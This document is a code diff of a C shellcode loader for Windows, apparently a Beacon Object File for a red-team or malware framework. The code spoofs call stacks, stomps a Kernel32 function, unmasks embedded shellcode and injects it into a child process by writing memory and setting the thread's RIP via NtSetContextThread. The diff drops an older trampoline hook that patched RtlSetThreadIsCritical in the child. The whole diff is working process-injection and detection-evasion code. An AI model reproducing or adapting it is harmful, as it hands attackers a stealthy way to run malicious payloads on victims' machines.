@@ -10,7 +10,6 @@
 
 #define SCW_STOMP_MODULE "Kernel32.dll"
 #define SCW_STOMP_FUNC "BaseCheckAppcompatCache"
-#define TRAMPOLINE_TARGET_FN (u64) NTDLL$RtlSetThreadIsCritical;
 
 char __SC__[0] __attribute__((section("sc")));
 char __MASK__[0] __attribute__((section("mask")));
@@ -18,7 +17,6 @@ char __MASK__[0] __attribute__((section("mask")));
 void go()
 {
     dprintf("[+] === START LOADER go()===\n");
-
 
     init_spoof();
     dprintf("[+] gadget=0x%llx\n", g_ctx.gadget);
@@ -38,7 +36,6 @@ void go()
 
     SCW w;
     scw_init(&w, stub, sizeof(stub));
-    // OLD IMPL: scw_load_and_call(&w,(u64)KERNEL32$VirtualAlloc,(u64)KERNEL32$VirtualProtect, (const u8 *)unmasked_sc, masked_sc->length);
     scw_stomp_and_call(&w,
                        (u64)KERNEL32$VirtualProtect,
                        SCW_STOMP_MODULE,
@@ -113,7 +110,7 @@ void go()
     /* ── Wait for child PEB to be ready ────────────────────────────── */
     /* poor mans sleep */
     unsigned long long start, now;
-    unsigned long long cycles = 300 * 3000000ULL; /* 3M cycles per ms */
+    unsigned long long cycles = 300 * 3000000ULL;
     __asm__ volatile("rdtsc" : "=A"(start));
     do
     {
@@ -198,66 +195,7 @@ void go()
         return;
     }
 
-    /* ── Build trampoline → shellcode ─────────────────────────────── */
-    /* jmp [rip+0] + shellcode_addr = 14 bytes */
-    u8 trampoline[14];
-    trampoline[0] = 0xFF;
-    trampoline[1] = 0x25;
-    trampoline[2] = 0x00;
-    trampoline[3] = 0x00;
-    trampoline[4] = 0x00;
-    trampoline[5] = 0x00;
-    *(u64 *)(trampoline + 6) = (u64)shellcode;
-
-    /* ── Find target function in child (same base as parent) ───────── */
-    u64 target_fn = TRAMPOLINE_TARGET_FN;
-
-    /* ── Make target function writable in child ────────────────────── */
-    PVOID tramp_base = (PVOID)(target_fn & ~(4096 - 1));
-    PVOID tramp_base_orig = tramp_base;
-    // SIZE_T tramp_size = 14 + (target_fn - (u64)tramp_base);
-    SIZE_T tramp_size = 4096;
-    SIZE_T tramp_size_orig = tramp_size;
-
-    ULONG tramp_oldp = 0;
-
-    status = (NTSTATUS)spoof_call(
-        (u64)NTDLL$NtProtectVirtualMemory,
-        (u64)hProcess, (u64)&tramp_base,
-        (u64)&tramp_size, (u64)PAGE_READWRITE, (u64)&tramp_oldp,
-        0, 0, 0, 0, 0, 0);
-    if (!NT_SUCCESS(status))
-    {
-        dprintf("[-] NtProtectVirtualMemory (trampoline): 0x%X\n", status);
-        return;
-    }
-
-    /* ── Write trampoline into child ───────────────────────────────── */
-    SIZE_T written = 0;
-    status = (NTSTATUS)spoof_call(
-        (u64)NTDLL$NtWriteVirtualMemory,
-        (u64)hProcess, (u64)target_fn,
-        (u64)trampoline, (u64)14, (u64)&written,
-        0, 0, 0, 0, 0, 0);
-    if (!NT_SUCCESS(status))
-    {
-        dprintf("[-] NtWriteVirtualMemory: 0x%X\n", status);
-        return;
-    }
-
-    tramp_base = tramp_base_orig;
-    tramp_size = tramp_size_orig;
-    /* ── Restore protection ─────────────────────────────────────────── */
-    status = (NTSTATUS)spoof_call(
-        (u64)NTDLL$NtProtectVirtualMemory,
-        (u64)hProcess, (u64)&tramp_base,
-        (u64)&tramp_size, (u64)PAGE_EXECUTE_READ,
-        (u64)&tramp_oldp,
-        0, 0, 0, 0, 0, 0);
-
-    /* ── Set RIP to trampoline target (not shellcode directly) ─────── */
-    ctx->Rip = target_fn;
-    // ctx->Rip = (DWORD64)shellcode;
+    ctx->Rip = (DWORD64)shellcode;
 
     status = (NTSTATUS)spoof_call(
         (u64)NTDLL$NtSetContextThread,
@@ -269,6 +207,6 @@ void go()
         return;
     }
 
-    dprintf("[+] RIP → trampoline → shellcode\n");
+    dprintf("[+] RIP → shellcode\n");
     dprintf("[+] === EXIT LOADER ===\n");
 }
